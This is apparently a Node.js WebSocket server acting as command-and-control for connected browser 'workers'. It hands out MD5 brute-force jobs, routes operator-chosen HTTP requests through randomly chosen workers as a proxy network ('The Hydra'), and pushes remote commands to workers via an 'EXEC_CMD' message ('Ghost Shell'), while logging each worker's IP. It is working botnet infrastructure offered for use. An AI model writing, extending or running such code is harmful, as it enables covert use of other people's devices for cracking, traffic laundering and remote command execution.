const express = require('express');
const { Server } = require('ws');
const http = require('http');
const cors = require('cors');
const path = require('path');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;

// --- ADVANCED MINING STATE ---
// We now use a Map to store detailed stats for every worker
// Key: WebSocket Connection | Value: { id, ip, role, lastSeen }
let workers = new Map(); 
let clients = new Set();    // Dashboard connections

let searchRange = 0;
const RANGE_SIZE = 100000;
let totalHashes = 0;
let foundGoldenTicket = null;

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new Server({ server });

// Helper: Generate cool Unit IDs (e.g., UNIT-A7X9)
function generateId() {
    return 'UNIT-' + Math.random().toString(36).substr(2, 4).toUpperCase();
}

// --- HTTP ROUTES ---
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/join', (req, res) => res.sendFile(path.join(__dirname, 'miner.html')));

// --- WEBSOCKET LOGIC ---
wss.on('connection', (ws, req) => {
    
    // 1. Assign Identity immediately upon connection
    const id = generateId();
    // Get IP (handles Render/Heroku proxies or direct localhost)
    const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ip = ipRaw ? ipRaw.split(',')[0] : 'Unknown';

    // 2. Register in Database as IDLE initially
    workers.set(ws, { 
        id: id, 
        ip: ip, 
        role: 'CONNECTING', 
        status: 'Online' 
    });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleMessage(ws, data);
        } catch (e) {
            console.error('Invalid JSON:', e.message);
        }
    });

    ws.on('close', () => {
        // Remove from tracking when they disconnect
        workers.delete(ws);
        clients.delete(ws);
        broadcastStats();
    });
});

// --- CORE SYSTEM LOGIC ---
function handleMessage(ws, data) {
    // Retrieve the worker's metadata
    const worker = workers.get(ws);

    switch (data.type) {

        // --- REGISTRATION ---
        case 'REGISTER_WORKER':
            if (worker) {
                worker.role = 'MINING'; // Default job
                worker.type = 'NODE';   // Mark as a compute node
            }
            console.log(`[${worker ? worker.id : '?'}] Reported for duty.`);
            sendJob(ws);
            broadcastStats();
            break;

        case 'REGISTER_CLIENT':
            clients.add(ws);
            // Clients (Dashboards) should not appear in the Worker Grid
            workers.delete(ws); 
            broadcastStats();
            break;

        // --- MINING / CRACKING ---
        case 'JOB_COMPLETE':
            // Update stats
            totalHashes += RANGE_SIZE;
            if (worker) worker.role = 'MINING'; // Ensure status is correct

            if (data.solution) {
                foundGoldenTicket = data.solution;
                console.log("!!! GOLDEN TICKET FOUND: " + data.solution);
            }

            // Keep grinding if not found
            if (!foundGoldenTicket) {
                sendJob(ws);
            }
            broadcastStats();
            break;

        // --- PROXY (The Hydra) ---
        case 'SEND_PROXY_CMD':
            // 1. Pick a random worker from the Map
            const workerList = Array.from(workers.keys());
            if (workerList.length > 0) {
                const targetWs = workerList[Math.floor(Math.random() * workerList.length)];
                const targetMeta = workers.get(targetWs);
                
                // Update status to show they are busy
                if (targetMeta) {
                    targetMeta.role = 'PROXYING';
                    broadcastStats();
                }

                targetWs.send(JSON.stringify({
                    type: 'HTTP_PROXY',
                    url: data.url,
                    requestId: Date.now()
                }));
            }
            break;

        case 'PROXY_RESULT':
            // Forward result to Dashboards
            clients.forEach(c => c.send(JSON.stringify({ type: 'PROXY_LOG', data: data })));
            
            // Reset worker status to Mining after a brief moment
            if (worker) {
                setTimeout(() => { 
                    if (workers.has(ws)) { // Check if still connected
                        worker.role = 'MINING'; 
                        broadcastStats();
                    }
                }, 1000);
            }
            break;

        // --- SHELL (Ghost Shell) ---
        case 'SEND_SHELL_CMD':
            const shellWorkers = Array.from(workers.keys());
            if (shellWorkers.length > 0) {
                const target = shellWorkers[0]; // Pick first available
                target.send(JSON.stringify({ type: 'EXEC_CMD', command: data.command }));
            }
            break;

        case 'SHELL_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SHELL_LOG', output: data.output })));
             break;
    }
}

function sendJob(ws) {
    if (foundGoldenTicket) {
        ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
        return;
    }

    const start = searchRange;
    const end = searchRange + RANGE_SIZE;
    searchRange += RANGE_SIZE;

    // Sending the MD5 Cracking Job (Target: "1234")
    ws.send(JSON.stringify({
        type: 'MINING_JOB',
        start: start,
        end: end,
        target: '81dc9bdb52d04dc20036dbd8313ed055' 
    }));
}

function broadcastStats() {
    // Convert Map values to an Array for the frontend
    const workerArray = Array.from(workers.values());

    const stats = JSON.stringify({
        type: 'STATS',
        workers: workerArray, // Sending full object list now
        totalHashes: totalHashes,
        goldenTicket: foundGoldenTicket
    });

    clients.forEach(client => {
        if (client.readyState === 1) client.send(stats);
    });
}

server.listen(PORT, () => console.log(`Watchtower Online on ${PORT}`));
